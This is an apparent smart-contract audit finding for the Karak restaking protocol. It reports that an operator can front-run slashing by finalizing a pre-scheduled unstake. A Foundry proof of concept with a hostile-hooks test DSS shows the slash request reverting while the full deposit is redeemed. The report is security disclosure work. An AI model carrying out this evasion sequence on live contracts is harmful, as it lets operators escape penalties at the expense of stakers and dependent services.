# Lines of code

https://github.com/code-423n4/2024-07-karak/blob/main/src/entities/SlasherLib.sol#L52
https://github.com/code-423n4/2024-07-karak/blob/main/src/Core.sol#L149


# Vulnerability details

## Impact
Gives malicious operators an opportunity of front-running to disrupt the DSS operation and they effectively dodge the slashing event.

## Proof of Concept
Operator can avoid slashing by pre-scheduling an unstake request and front-running the `requestSlashing`.
DSS can slash any vault as long it belongs to a registered operator and fully staked into the DSS. Operator can `pre-schedule an unstake` of the vault early enough to pass the delay (`MIN_STAKE_UPDATE_DELAY`) and get ready to finalize the unstaking at any moment. Basically, they can request an unstaking right after they staked.

If a slashing event comes up targeting the vault, operator can finalize the unstaking by front-running `requestSlashing`. Hence, the slashing would then fail since it's targeting an unstaked vault. If the slashing targets multiple vaults, operator just need to unstake any one of them to prevent slashing.
```solidity
    function validateVaultsAndSlashPercentages(
        CoreLib.Storage storage self,
        SlashRequest memory slashingRequest,
        IDSS dss
    ) internal view {
        if (slashingRequest.vaults.hasDuplicates()) revert DuplicateSlashingVaults();

        uint256 maxSlashPercentageWad = getDSSMaxSlashablePercentageWad(self, dss);
        for (uint256 i = 0; i < slashingRequest.vaults.length; i++) {
            if (!self.operatorState[slashingRequest.operator].isVaultStakeToDSS(dss, slashingRequest.vaults[i])) {
>               revert VaultNotStakedToDSS();
            }
            if (slashingRequest.slashPercentagesWad[i] == 0) revert ZeroSlashPercentageWad();
            if (slashingRequest.slashPercentagesWad[i] > maxSlashPercentageWad) revert MaxSlashPercentageWadBreached();
        }
    }
```

## Tools Used
Manual Review

## Recommended Mitigation Steps
1. Let the unstaking request expire if it stays too long.
2. Give the DSS ability to communicate with core to pause the vault on unstaking. Map index: Constants.PAUSE_CORE_FINALIZE_STAKE_UPDATE


## Assessed type

Other

## Proof of Concept (added after pre-submit check)

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.25;

import "../helpers/OperatorHelper.sol";

// A DSS that allows staking but reverts in every unstake and slashing hook: it cannot block the operator's unstake.
contract HostileHooksDSS is IDSS {
    function registrationHook(address, bytes memory) external {}
    function unregistrationHook(address, bytes memory) external pure {
        revert();
    }

    function requestUpdateStakeHook(address, Operator.StakeUpdateRequest memory req) external pure {
        if (!req.toStake) revert();
    }

    function cancelUpdateStakeHook(address, address) external pure {
        revert();
    }

    function finishUpdateStakeHook(address) external pure {
        revert();
    }

    function requestSlashingHook(address, uint256[] memory) external pure {
        revert();
    }

    function cancelSlashingHook(address) external pure {
        revert();
    }

    function finishSlashingHook(address) external pure {
        revert();
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}

contract Poc41 is OperatorHelper {
    Vault vault;
    bytes32 withdrawalKey;
    Operator.QueuedStakeUpdate queuedUnstake;
    uint256 t0;

    // Operator stakes vault 0, then immediately pre-schedules its unstake and queues a redeem of
    // all shares (the operator controls the depositor account in this scenario).
    function _prepare() internal {
        dss = IDSS(address(new HostileHooksDSS()));
        vm.prank(address(dss));
        core.registerDSS(dssMaxSlashablePercentageWad);

        stake_vaults_to_dss();
        vault = Vault(address(vaults[0]));
        t0 = block.timestamp;

        vm.prank(operator);
        queuedUnstake = core.requestUpdateVaultStakeInDSS(
            Operator.StakeUpdateRequest({vault: address(vault), dss: dss, toStake: false})
        );

        uint256 shares = vault.balanceOf(address(this));
        vault.approve(address(vault), shares);
        withdrawalKey = vault.startRedeem(shares, address(this));
    }

    function _slashRequest() internal view returns (SlasherLib.SlashRequest memory) {
        address[] memory v = new address[](1);
        v[0] = address(vault);
        uint96[] memory pct = new uint96[](1);
        pct[0] = uint96(10 * Constants.ONE_WAD);
        return SlasherLib.SlashRequest({operator: operator, slashPercentagesWad: pct, vaults: v});
    }

    function test_control_slash_requested_one_second_before_unstake_matures_succeeds() public {
        _prepare();
        vm.warp(t0 + Constants.MIN_STAKE_UPDATE_DELAY - 1);

        vm.prank(address(dss));
        SlasherLib.QueuedSlashing memory queued = core.requestSlashing(_slashRequest());

        vm.warp(block.timestamp + Constants.SLASHING_VETO_WINDOW);
        core.finalizeSlashing(queued);
        core.finalizeUpdateVaultStakeInDSS(queuedUnstake);
        vault.finishRedeem(withdrawalKey);

        assertEq(depositToken.balanceOf(address(this)), 900);
    }

    function test_operator_finalizes_unstake_first_and_slash_request_reverts() public {
        _prepare();
        vm.warp(t0 + Constants.MIN_STAKE_UPDATE_DELAY);

        assertEq(core.fetchVaultsStakedInDSS(operator, dss).length, 2);
        uint256 balBefore = depositToken.balanceOf(address(this));

        // Operator's finalize lands first. The DSS's hooks all revert, yet finalization still goes through.
        vm.prank(operator);
        core.finalizeUpdateVaultStakeInDSS(queuedUnstake);
        assertEq(core.fetchVaultsStakedInDSS(operator, dss).length, 1);

        // DSS wants to slash the vault for conduct while it was staked: the request reverts.
        SlasherLib.SlashRequest memory req = _slashRequest();
        vm.prank(address(dss));
        vm.expectRevert(VaultNotStakedToDSS.selector);
        core.requestSlashing(req);

        // The queued redeem matures in the same block and pays out the full amount.
        vault.finishRedeem(withdrawalKey);
        uint256 received = depositToken.balanceOf(address(this)) - balBefore;

        emit log_named_uint("vault 0 deposit", 1000);
        emit log_named_uint("received after evading slash", received);
        emit log_named_uint("vault 0 totalAssets left", vault.totalAssets());

        assertEq(received, 1000);
        assertEq(vault.totalAssets(), 0);
    }
}
```

Run: forge test --match-path test/basanos/Poc41.t.sol -vv

```
Ran 2 tests for test/basanos/Poc41.t.sol:Poc41
[PASS] test_control_slash_requested_one_second_before_unstake_matures_succeeds() (gas: 2280591)
[PASS] test_operator_finalizes_unstake_first_and_slash_request_reverts() (gas: 2175266)
Logs:
  vault 0 deposit: 1000
  received after evading slash: 1000
  vault 0 totalAssets left: 0

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 12.69ms (8.73ms CPU time)

Ran 1 test suite in 178.55ms (12.69ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
```

## Response to reviewer checklist

1. Reproducible sequence: done. `test_operator_finalizes_unstake_first_and_slash_request_reverts` stakes the vault, pre-schedules the unstake and a staker redeem of all shares, finalizes the unstake first, and shows `requestSlashing` reverting with `VaultNotStakedToDSS` while the redeem then pays out the full 1000. `test_control_slash_requested_one_second_before_unstake_matures_succeeds` shows the same slash succeeds (900 paid out) if the DSS acts one second earlier, so the evasion depends on ordering.
2. DSS cannot observe or block the unstake: the test DSS reverts in every unstake and slashing hook, and `finalizeUpdateVaultStakeInDSS` still succeeds (the finish hook uses `ignoreFailure: true`, and the request hook ignores failure for unstakes). Core has no DSS veto over finalization. The DSS can see the request through `requestUpdateStakeHook`, but the PoC does not model off-chain monitoring.
3. README guidance: the README tells the DSS to stop counting a vault once an unstake is queued and says "sitting on a queued withdraw doesn't provide an operator any edge". That guidance covers rewards and weighting. It does not say slashing must remain possible after the delay matures. The PoC shows the exit succeeding with the slash blocked, so a judge may still treat this as intended design and I do not claim otherwise.
